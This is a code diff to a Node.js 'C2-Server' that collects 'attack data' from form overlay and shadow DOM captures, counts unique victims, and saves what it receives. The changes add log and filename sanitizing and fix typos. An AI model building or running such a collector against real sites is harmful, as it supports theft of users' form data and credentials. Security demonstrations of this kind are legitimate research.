@@ -38,12 +38,11 @@ const ANALYSIS_DIR = path.join(__dirname, 'analysis')
   }
 })
 
-// Attack session tracking
-let activeSessions = new Map()
+// Attack statistics tracking
 let attackStatistics = {
   totalRequests: 0,
   domMonitorSessions: 0,
-  formOverlayCaptues: 0,
+  formOverlayCaptures: 0,
   shadowDomCaptures: 0,
   uniqueVictims: new Set(),
   startTime: Date.now()
@@ -52,23 +51,45 @@ let attackStatistics = {
 /**
  * Utility Functions
  */
+
+// Sanitize string for safe logging (prevent log injection)
+function sanitizeForLog(input) {
+  if (typeof input !== 'string') {
+    input = String(input)
+  }
+  // Remove newlines, carriage returns, and other control characters
+  return input.replace(/[\r\n\t\x00-\x1f\x7f]/g, ' ').substring(0, 500)
+}
+
+// Sanitize string for safe filename (prevent path traversal)
+function sanitizeForFilename(input) {
+  if (typeof input !== 'string') {
+    input = String(input)
+  }
+  // Allow only alphanumeric, underscore, hyphen; replace others with underscore
+  return input.replace(/[^a-zA-Z0-9_-]/g, '_').substring(0, 50) || 'unknown'
+}
+
 function logToConsole(level, message, data = null) {
   const timestamp = new Date().toISOString()
-  const logEntry = `[${timestamp}] [${level.toUpperCase()}] [C2-Server] ${message}`
+  const safeMessage = sanitizeForLog(message)
+  const logEntry = `[${timestamp}] [${level.toUpperCase()}] [C2-Server] ${safeMessage}`
 
   console.log(logEntry)
   if (data) {
+    // JSON.stringify safely escapes special characters
     console.log('  Data:', JSON.stringify(data, null, 2))
   }
 }
 
 function generateSessionId() {
-  return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
+  return 'session_' + Date.now() + '_' + Math.random().toString(36).substring(2, 11)
 }
 
 function saveAttackData(attackType, data) {
   const timestamp = new Date().toISOString().replace(/[:.]/g, '-')
-  const filename = `${attackType}_${timestamp}.json`
+  const safeAttackType = sanitizeForFilename(attackType)
+  const filename = `${safeAttackType}_${timestamp}.json`
   const filepath = path.join(DATA_DIR, filename)
 
   const enrichedData = {
@@ -244,7 +265,7 @@ function updateStatistics(data) {
       attackStatistics.domMonitorSessions++
       break
     case 'form_overlay_capture':
-      attackStatistics.formOverlayCaptues++
+      attackStatistics.formOverlayCaptures++
       break
     case 'shadow_dom_capture':
     case 'shadow_session_end':
@@ -261,10 +282,10 @@ function updateStatistics(data) {
 app.post('/collect', (req, res) => {
   try {
     const attackData = req.body
-    const clientIp = req.ip || req.connection.remoteAddress
+    const clientIp = sanitizeForLog(req.ip || req.connection.remoteAddress || 'unknown')
 
     logToConsole('info', `Received attack data from ${clientIp}`, {
-      type: attackData.type,
+      type: sanitizeForLog(attackData.type || 'unknown'),
       timestamp: attackData.timestamp,
       size: JSON.stringify(attackData).length
     })
@@ -501,7 +522,7 @@ app.post('/clear', (req, res) => {
     attackStatistics = {
       totalRequests: 0,
       domMonitorSessions: 0,
-      formOverlayCaptues: 0,
+      formOverlayCaptures: 0,
       shadowDomCaptures: 0,
       uniqueVictims: new Set(),
       startTime: Date.now()
